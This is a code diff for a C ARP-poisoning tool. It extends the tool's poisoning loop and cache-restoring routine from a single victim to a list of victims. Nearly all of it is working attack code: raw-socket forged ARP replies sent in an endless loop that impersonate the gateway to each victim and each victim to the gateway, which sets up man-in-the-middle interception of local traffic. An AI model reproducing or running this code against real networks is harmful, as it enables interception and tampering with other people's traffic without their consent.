@@ -43,9 +43,7 @@ int send_arp_reply(int sockfd, unsigned char *target_mac, unsigned char *target_
     memcpy(eth->h_dest, target_mac, 6);
     eth->h_proto = htons(ETH_P_ARP);
 
-    // Build ARP header (reusing struct from arp_scan.c implicitly)
-    // Structure layout: hw_type(2), proto_type(2), hw_len(1), proto_len(1), opcode(2)
-    // sender_mac(6), sender_ip(4), target_mac(6), target_ip(4)
+    // Build standard ARP header overlaying the buffer space
     uint16_t *hw_type = (uint16_t *)(buffer + 14);
     uint16_t *proto_type = (uint16_t *)(buffer + 16);
     *hw_type = htons(1);
@@ -73,8 +71,8 @@ int send_arp_reply(int sockfd, unsigned char *target_mac, unsigned char *target_
 }
 
 // Continuous poisoning loop
-void start_poisoning(unsigned char *victim_ip, unsigned char *victim_mac, unsigned char *gateway_ip, unsigned char *gateway_mac) {
-    printf("Starting ARP poisoning loop...\n");
+void start_poisoning(struct Victim *victims, int victim_count, unsigned char *gateway_ip, unsigned char *gateway_mac) {
+    printf("Starting ARP poisoning loop for %d victims...\n", victim_count);
     int sockfd;
     if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
         perror("socket");
@@ -90,11 +88,13 @@ void start_poisoning(unsigned char *victim_ip, unsigned char *victim_mac, unsign
 
     // Infinite loop sending forged packets
     while (1) {
-        // 1. Tell Victim: "I am the Gateway"
-        send_arp_reply(sockfd, victim_mac, victim_ip, my_mac, gateway_ip);
-        
-        // 2. Tell Gateway: "I am the Victim"
-        send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, victim_ip);
+        for (int i = 0; i < victim_count; i++) {
+            // 1. Tell Victim: "I am the Gateway"
+            send_arp_reply(sockfd, victims[i].mac, victims[i].ip, my_mac, gateway_ip);
+            
+            // 2. Tell Gateway: "I am the Victim"
+            send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, victims[i].ip);
+        }
 
         printf("Poison packets sent. Sleeping...\n");
         sleep(2); // Wait before re-poisoning
@@ -105,8 +105,8 @@ void start_poisoning(unsigned char *victim_ip, unsigned char *victim_mac, unsign
 }
 
 // Sends authentic ARP replies to restore caches
-void heal_arp(unsigned char *victim_ip, unsigned char *victim_mac, unsigned char *gateway_ip, unsigned char *gateway_mac) {
-    printf("\n[HEALING] Restoring ARP caches for Victim and Gateway...\n");
+void heal_arp(struct Victim *victims, int victim_count, unsigned char *gateway_ip, unsigned char *gateway_mac) {
+    printf("\n[HEALING] Restoring ARP caches for %d Victims and Gateway...\n", victim_count);
     int sockfd;
     if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
         perror("socket");
@@ -114,13 +114,14 @@ void heal_arp(unsigned char *victim_ip, unsigned char *victim_mac, unsigned char
     }
 
     // Send the authentic replies 3 times to ensure they are received
-    for(int i = 0; i < 3; i++) {
-        // 1. Tell Victim: "The Gateway is really at the Gateway's MAC"
-        send_arp_reply(sockfd, victim_mac, victim_ip, gateway_mac, gateway_ip);
-        
-        // 2. Tell Gateway: "The Victim is really at the Victim's MAC"
-        send_arp_reply(sockfd, gateway_mac, gateway_ip, victim_mac, victim_ip);
-
+    for(int j = 0; j < 3; j++) {
+        for (int i = 0; i < victim_count; i++) {
+            // 1. Tell Victim: "The Gateway is really at the Gateway's MAC"
+            send_arp_reply(sockfd, victims[i].mac, victims[i].ip, gateway_mac, gateway_ip);
+            
+            // 2. Tell Gateway: "The Victim is really at the Victim's MAC"
+            send_arp_reply(sockfd, gateway_mac, gateway_ip, victims[i].mac, victims[i].ip);
+        }
         // Sleep briefly to avoid flooding
         usleep(500000); 
     }
